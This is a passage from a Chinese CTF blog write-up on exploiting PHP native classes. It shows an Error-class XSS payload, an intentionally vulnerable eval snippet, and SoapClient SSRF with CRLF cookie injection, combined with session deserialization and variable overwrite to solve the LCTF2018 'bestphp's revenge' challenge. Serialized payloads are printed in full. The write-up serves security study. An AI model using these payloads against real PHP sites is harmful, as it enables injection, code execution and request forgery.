<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> Error(<span style="color:#b44">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> urlencode(serialize(<span style="color:#b8860b">$a</span>));
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>得到:</p>
<blockquote>
<p>O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A29%3A%22D%3A%5Cphpstudy_pro%5CWWW%5Cerror.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</p>
</blockquote>
<p>将以上字符串赋给cmd就可以看到弹框：</p>
<p><p class="markdown-image">
  <img src="/img/39.png" alt="alt text"  />
</p></p>
<ul>
<li>Error 命令执行</li>
</ul>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;a&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;b&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">eval</span>(<span style="color:#b44">&#34;echo new </span><span style="color:#b68;font-weight:bold">$a</span><span style="color:#b44">(</span><span style="color:#b68;font-weight:bold">$b</span><span style="color:#b44">());&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>此时通过传<code>?a=Error&amp;b=phpinfo</code>就可以执行命令</p>
<p><p class="markdown-image">
  <img src="/img/40.png" alt="alt text"  />
</p></p>
<ol start="2">
<li>SoapClient类的使用</li>
</ol>
<p>SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息。php中的soapClient类可以创建soap数据报文，与wsdl接口进行交互,而WSDL文件是描述SOAP服务的接口。</p>
<p>SoapClient类的构造函数如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">public</span> SoapClient <span style="color:#666">::</span> <span style="color:#b44">SoapClient</span> （mixed <span style="color:#b8860b">$wsdl</span> [，array <span style="color:#b8860b">$options</span> ]）
</span></span></code></pre></div><p>第一个参数是用来指明是否是wsdl模式。</p>
<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
<p>示例：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> SoapClient(<span style="color:#a2f;font-weight:bold">null</span>,<span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;location&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;http://127.0.0.1/flag.php&#34;</span>,<span style="color:#b44">&#39;uri&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;123&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> urlencode(serialize(<span style="color:#b8860b">$a</span>));
</span></span></code></pre></div><p><strong>bestphp‘revenge</strong></p>
<p>知识点：</p>
<ol>
<li>
<p>session反序列化</p>
</li>
<li>
<p>原生类SoapClient的SSRF</p>
</li>
<li>
<p>extract()变量覆盖</p>
</li>
<li>
<p>CRLF</p>
</li>
</ol>
<p>题目打开看到源码如下：</p>
<p><p class="markdown-image">
  <img src="/img/49.png" alt="alt text"  />
</p></p>
<p>dirsearch扫描发现flag.php</p>
<p><p class="markdown-image">
  <img src="/img/50.png" alt="alt text"  />
</p></p>
<p>于是访问：</p>
<p><p class="markdown-image">
  <img src="/img/51.png" alt="alt text"  />
</p></p>
<p>提示要localhost，暗示ssrf,又有session,说明要用到session反序列化，利用php原生类实现ssrf。</p>
<p>现在来分析一下题目源码：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;implode&#39;</span>;
</span></span><span style="display:flex;"><span>call_user_func(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;f&#39;</span>], <span style="color:#b8860b">$_POST</span>);
</span></span><span style="display:flex;"><span>session_start();
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span> (isset(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;name&#39;</span>] <span style="color:#666">=</span> <span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>var_dump(<span style="color:#b8860b">$_SESSION</span>);
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">array</span>(reset(<span style="color:#b8860b">$_SESSION</span>), <span style="color:#b44">&#39;welcome_to_the_lctf2018&#39;</span>);
</span></span><span style="display:flex;"><span>call_user_func(<span style="color:#b8860b">$b</span>, <span style="color:#b8860b">$a</span>);
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>思路：</p>
<ol>
<li>
<p>$b虽然已经给了初值，但能利用这行<code>call_user_func($_GET['f'], $_POST);</code>实现值覆盖。</p>
</li>
<li>
<p>利用session_start()指定php_serialize做序列化引擎，因为反序列化默认引擎是php,将ssrf序列化内容前加<code>|</code>后通过name就可以存储我们构造的session。</p>
</li>
<li>
<p>再看到这行<code>call_user_func($b, $a);</code>想到可以让$b覆盖为<code>call_user_func</code>,此时就变成<code>call_user_func(call_user_func,array($_session,‘welcome_to_the_lctf2018’));</code>,$session这个对象会去调用<code>welcome_to_the_lctf2018</code>这个不存在方法,触发call，服务器就会携带我们设置的cookie去访问flag.php。</p>
</li>
</ol>
<p>构造ssrf内容:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$target</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;http://127.0.0.1/flag.php&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> SoapClient(<span style="color:#a2f;font-weight:bold">null</span>,<span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;location&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b8860b">$target</span>,
</span></span><span style="display:flex;"><span>   	 <span style="color:#b44">&#39;user_agent&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;npfs</span><span style="color:#b62;font-weight:bold">\r\n</span><span style="color:#b44">Cookie:PHPSESSID=123456</span><span style="color:#b62;font-weight:bold">\r\n</span><span style="color:#b44">&#34;</span>,
</span></span><span style="display:flex;"><span>   	 <span style="color:#b44">&#39;uri&#39;</span><span style="color:#666">=&gt;</span><span style="color:#b44">&#34;http://127.0.0.1/&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$se</span> <span style="color:#666">=</span> serialize(<span style="color:#b8860b">$b</span>);
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;|&#34;</span> <span style="color:#666">.</span> urlencode(<span style="color:#b8860b">$se</span>);
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>浏览器打开得到如下字符串：</p>
<blockquote>
<p>|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A31%3A%22npfs%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</p>
</blockquote>
<p>指定序列化引擎：</p>
<p><p class="markdown-image">
  <img src="/img/52.png" alt="alt text"  />
</p></p>
<p>利用extract函数覆盖b的值并修改cookie即可：</p>
<p><p class="markdown-image">
  <img src="/img/53.png" alt="alt text"  />
</p></p>
    </div>

    
    
    
  <div id="comment">
    
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "your-disqus-shortname" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  </div>


</section>


    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/bubbleo0O" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="your-stackoverflow-link" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>stackoverflow</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-488.000000, -1163.000000)">
            <g id="stackoverflow" transform="translate(488.000000, 1163.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M42.0860128,53.5922927 L22.9745951,53.6011499 L22.9729497,49.5538824 L42.0835447,49.5440929 L42.0860128,53.5922927 L42.0860128,53.5922927 Z M55,30.6708298 L51.7306912,12 L47.7087256,12.6920259 L50.9775643,31.3628557 L55,30.6708298 L55,30.6708298 Z M42.5455518,44.3547147 L23.5156994,42.616026 L23.1410164,46.6470941 L42.1712214,48.3841513 L42.5455518,44.3547147 L42.5455518,44.3547147 Z M43.8009984,39.0731519 L25.3459811,34.1539179 L24.285633,38.0621508 L42.7419431,42.9819676 L43.8009984,39.0731519 L43.8009984,39.0731519 Z M46.2103463,34.4436411 L29.7494464,24.8164635 L27.6748215,28.3015328 L44.1365441,37.9292931 L46.2103463,34.4436411 L46.2103463,34.4436411 Z M50.2466504,31.6088756 L46.8745036,33.8883189 L36.106599,18.2318456 L39.4792159,15.9517031 L50.2466504,31.6088756 Z M45.3315807,40.2784283 L48.5799693,40.2784283 L48.5799693,60 L17,60 L17,40.2784283 L20.2648427,40.2784283 L20.2648427,56.8243495 L45.3315807,56.8243495 L45.3315807,40.2784283 Z" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="your-twitter-link" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       © Copyright 
       2024 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Bubble
    
    </div>

    
      <div class="powerby">
        Powered by <a href='http://www.gohugo.io/'>Hugo</a> Theme By <a href='https://github.com/nodejh/hugo-theme-mini'>nodejh</a>
      </div>
    
</footer>



  </body>
</html>
